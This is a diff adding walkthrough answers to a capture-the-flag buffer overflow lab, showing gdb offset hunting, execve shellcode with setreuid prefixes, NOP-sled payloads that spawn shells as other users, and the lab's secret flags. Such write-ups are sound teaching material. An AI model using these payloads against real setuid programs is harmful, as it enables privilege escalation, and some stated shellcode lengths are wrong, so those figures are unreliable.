@@ -475,17 +475,170 @@ python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_da
 Using this format would be something like this for this challenge:
 
 ```bash
-python -c “print(‘\x90’ * 30 + ‘\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05’ +
-‘\x41’ * 60 + 
-‘\xef\xbe\xad\xde’) | ./program_name
- ”
+python -c "print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' +
+'\x41' * 60 + 
+'\xef\xbe\xad\xde') | ./program_name
+"
 ```
 
 In some cases you may need to pass xargs before ./program_name.
 
 ## #1 - Use the above method to open a shell and read the contents of the secret.txt file.
 
+**offset**
 
+~~~
+[user1@ip-10-10-93-165 overflow-3]$ gdb -q buffer-overflow
+(gdb) run $(python -c "print('A'*158)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*158)")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? ()
+(gdb) run $(python -c "print('A'*159)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*159)")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400563 in copy_arg ()
+(gdb) 
+~~~
+
+With a 158 bytes length payload, we are overwritting 6 bytes of the return address. As a result, the offset will be **152 bytes**.
+
+**shellcode**
+
+After many attempts, all failing with an "Illegal instruction" error, I found a shellcode (40 bytes) that works here: https://www.arsouyes.org/blog/2019/54_Shellcode/
+
+```python
+>>> shellcode = '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
+>>> len(shellcode)
+40
+```
+
+**Return address**
+
+The last item we need to complete our payload is the return address of the shell code (6 bytes). Our payload will be like this:
+
+~~~
+┌───────────────────┬────────────────────┬────────────────────┬────────────────────┐
+│ NOP sled (90)     │  shell code (40)   │  random chars (22) │ Memory address (6) │
+└───────────────────┴────────────────────┴────────────────────┴────────────────────┘
+total length = 90 + 40 + 22 + 6 = 158
+~~~
+
+```python
+>>> payload = '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6
+>>> len(payload)
+158
+```
+
+Let's try that:
+
+~~~
+(gdb) run $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6)")
+Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6)")
+Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
+Here's a program that echo's out your input
+������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�����������������������BBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000424242424242 in ?? ()
+~~~
+
+See where NOP sled string is located, and beginning of shellcode.
+
+~~~
+(gdb) x/100x $rsp-200
+0x7fffffffe218:	0x00400450	0x00000000	0xffffe3d0	0x00007fff
+0x7fffffffe228:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
+0x7fffffffe238:	0xffffe639	0x00007fff	0x90909090	0x90909090 <--- NOP sled
+0x7fffffffe248:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffe258:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffe268:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffe278:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffe288:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffe298:	0x3b6a9090	0xd2314858	0x2f2fb849	0x2f6e6962 <--- shellcode
+0x7fffffffe2a8:	0xc1496873	0x504108e8	0x52e78948	0xe6894857
+0x7fffffffe2b8:	0x3c6a050f	0xff314858	0x9090050f	0x90909090
+0x7fffffffe2c8:	0x90909090	0x90909090	0x90909090	0x90909090
+0x7fffffffe2d8:	0x42424242	0x00004242	0xffffe3d8	0x00007fff
+0x7fffffffe2e8:	0x00000000	0x00000002	0x004005a0	0x00000000
+0x7fffffffe2f8:	0xf7a4302a	0x00007fff	0x00000000	0x00000000
+0x7fffffffe308:	0xffffe3d8	0x00007fff	0x00040000	0x00000002
+0x7fffffffe318:	0x00400564	0x00000000	0x00000000	0x00000000
+0x7fffffffe328:	0xc7dc72b8	0x7f14507a	0x00400450	0x00000000
+0x7fffffffe338:	0xffffe3d0	0x00007fff	0x00000000	0x00000000
+0x7fffffffe348:	0x00000000	0x00000000	0x0a9c72b8	0x80ebaf05
+0x7fffffffe358:	0x935872b8	0x80ebbfb2	0x00000000	0x00000000
+0x7fffffffe368:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe378:	0xffffe3f0	0x00007fff	0xf7ffe130	0x00007fff
+0x7fffffffe388:	0xf7de7656	0x00007fff	0x00000000	0x00000000
+0x7fffffffe398:	0x00000000	0x00000000	0x00000000	0x00000000
+~~~
+
+Let's take any address between the NOP sled and the shellcode (e.g. `0x7fffffffe288`). Here is the final payload:
+
+~~~
+$ ./buffer-overflow $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\x88\xe2\xff\xff\xff\x7f')")
+~~~
+
+When executed, the programs eventually spawns a shell.
+
+~~~
+[user1@ip-10-10-12-188 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\x88\xe2\xff\xff\xff\x7f')")
+Here's a program that echo's out your input
+������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1����������������������������
+sh-4.2$ whoami
+user1
+sh-4.2$ cat secret.txt 
+cat: secret.txt: Permission denied
+sh-4.2$ 
+~~~
+
+As you can see above, we are not allowed to access the secret though, because we are not user2.
+
+**setreuid**
+
+Let's use pwntools to generate a prefix to our shellcode to run SETREUID:
+
+~~~
+$ pwn shellcraft -f d amd64.linux.setreuid 1002
+\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+$ python
+>>> len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
+14
+~~~
+
+Our payload now looks like this:
+
+~~~
+┌───────────────────┬────────────────────┬────────────────────┬────────────────────┬────────────────────┐
+│ NOP sled (90)     │  setreuid (14)     │ shellcode (40)     │ random chars (8)   │ Memory address (6) │
+└───────────────────┴────────────────────┴────────────────────┴────────────────────┴────────────────────┘
+total length = 90 + 14 + 40 + 8 + 6 = 158
+~~~
+
+Let's test:
+
+```
+[user1@ip-10-10-12-188 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*8 + '\x88\xe2\xff\xff\xff\x7f')")
+Here's a program that echo's out your input
+������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1��������������
+sh-4.2$ whoami
+user2
+sh-4.2$ cat secret.txt 
+omgyoudidthissocool!!
+sh-4.2$ 
+```
+
+Answer: `omgyoudidthissocool!!`
 
 # [Task 9] Buffer Overflow 2
 
@@ -493,3 +646,176 @@ Look at the overflow-4 folder. Try to use your newly learnt buffer overflow tech
 
 ## #1 - Use the same method to read the contents of the secret file!
 
+**Code**
+
+Below is the code for `buffer-overflow-2.c`:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void concat_arg(char *string)
+{
+    char buffer[154] = "doggo";
+    strcat(buffer, string);
+    printf("new word is %s\n", buffer);
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    concat_arg(argv[1]);
+}
+```
+
+Run:
+
+```
+[user1@ip-10-10-12-188 overflow-4]$ ./buffer-overflow-2 OOPS
+new word is doggoOOPS
+```
+
+**offset**
+
+The buffer is 154 bytes, but the string `doggo` (5 characters) is added. So we should begin to test from 154-5. Let's start with 8 more bytes:
+
+~~~
+(gdb) run $(python -c "print('A'*(154-5+8))")
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print('A'*(154-5+8))")
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004005d3 in main ()
+~~~
+
+Not enough to overwrite the return address. Let's add 8 more bytes:
+
+~~~
+(gdb) run $(python -c "print('A'*(154-5+8*2))")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print('A'*(154-5+8*2))")
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000004141 in ?? ()
+~~~
+
+Good, we start seing 2 times 'A' overwritting the return address. We need 6 in total, so we need 4 more:
+
+~~~
+(gdb) run $(python -c "print('A'*(154-5+8*2+4))")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print('A'*(154-5+8*2+4))")
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? ()
+~~~
+
+The offset is 169 (`154-5+8*2+4`).
+
+**Shellcode**
+
+We'll use the same shellcode (158 bytes) as previously, with the SETREUID. This time, we need to target user3 (ID is 1003), to be able to read `secret.txt`:
+
+```bash
+[user1@ip-10-10-189-18 overflow-4]$ ll
+total 20
+-rwsr-xr-x 1 user3 user3 8272 Sep  3  2019 buffer-overflow-2
+-rw-rw-r-- 1 user1 user1  250 Sep  3  2019 buffer-overflow-2.c
+-rw------- 1 user3 user3   17 Sep  2  2019 secret.txt
+[user1@ip-10-10-189-18 overflow-4]$ grep user3 /etc/passwd
+user3:x:1003:1003::/home/user3:/bin/bash
+```
+
+Let's generate the prefix for our shellcode:
+~~~
+$ pwn shellcraft -f d amd64.linux.setreuid 1003
+\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+$ python
+>>> len('\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
+14
+~~~
+
+
+```python
+>>> shellcode = '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
+>>> len(shellcode)
+40
+```
+
+**Return address**
+
+Now, let's have a look at our payload. It should look like this:
+
+~~~
+┌───────────────────┬────────────────────┬────────────────────┬────────────────────┐
+│ NOP sled (90)     │ shellcode (54)     │ random chars (19)  │ Memory address (6) │
+└───────────────────┴────────────────────┴────────────────────┴────────────────────┘
+total length = 90 + 54 + 19 + 6 = 169
+~~~
+
+```python
+>>> payload = 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6
+>>> len(payload)
+169
+```
+
+Let's debug:
+
+~~~
+$ gdb -q buffer-overflow-2
+Reading symbols from buffer-overflow-2...(no debugging symbols found)...done.
+(gdb) run $(python -c "print('A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6)")
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print('A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6)")
+Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�BBBBBBBBBBBBBBBBBBBCCCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000434343434343 in ?? ()
+(gdb) x/100x $rsp-200
+0x7fffffffe208:	0x004005a9	0x00000000	0xf7ffa268	0x00007fff
+0x7fffffffe218:	0xffffe62c	0x00007fff	0x67676f64	0x4141416f
+0x7fffffffe228:	0x41414141	0x41414141	0x41414141	0x41414141 <--- will be our NOP sled (currently 'A')
+0x7fffffffe238:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe248:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe258:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe268:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe278:	0x41414141	0x31414141	0xebbf66ff	0x58716a03 <--- shellcode
+0x7fffffffe288:	0x0ffe8948	0x583b6a05	0x49d23148	0x622f2fb8
+0x7fffffffe298:	0x732f6e69	0xe8c14968	0x48504108	0x5752e789
+0x7fffffffe2a8:	0x0fe68948	0x583c6a05	0x0fff3148	0x42424205
+0x7fffffffe2b8:	0x42424242	0x42424242	0x42424242	0x42424242 <--- random chars
+0x7fffffffe2c8:	0x43434343	0x00004343	0xffffe3c8	0x00007fff <--- return address
+0x7fffffffe2d8:	0x00000000	0x00000002	0x004005e0	0x00000000
+0x7fffffffe2e8:	0xf7a4302a	0x00007fff	0x00000000	0x00000000
+0x7fffffffe2f8:	0xffffe3c8	0x00007fff	0x00040000	0x00000002
+0x7fffffffe308:	0x004005ac	0x00000000	0x00000000	0x00000000
+0x7fffffffe318:	0xb5081d5d	0x166c42e5	0x00400450	0x00000000
+0x7fffffffe328:	0xffffe3c0	0x00007fff	0x00000000	0x00000000
+0x7fffffffe338:	0x00000000	0x00000000	0x7b281d5d	0xe993bd9a
+0x7fffffffe348:	0xe10c1d5d	0xe993ad2d	0x00000000	0x00000000
+0x7fffffffe358:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe368:	0xffffe3e0	0x00007fff	0xf7ffe130	0x00007fff
+0x7fffffffe378:	0xf7de7656	0x00007fff	0x00000000	0x00000000
+0x7fffffffe388:	0x00000000	0x00000000	0x00000000	0x00000000
+~~~
+
+Let's take `0x7fffffffe268` as return address (between future NOP sled and beginning of shell code).
+
+**Payload**
+
+Now, our payload is ready:
+
+~~~
+[user1@ip-10-10-189-18 overflow-4]$ ./buffer-overflow-2 $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x68\xe2\xff\xff\xff\x7f')")
+new word is doggo������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1��������������������h����
+sh-4.2$ whoami
+user3
+sh-4.2$ cat secret.txt
+wowanothertime!!
+~~~
+
+Answer: `wowanothertime!!`
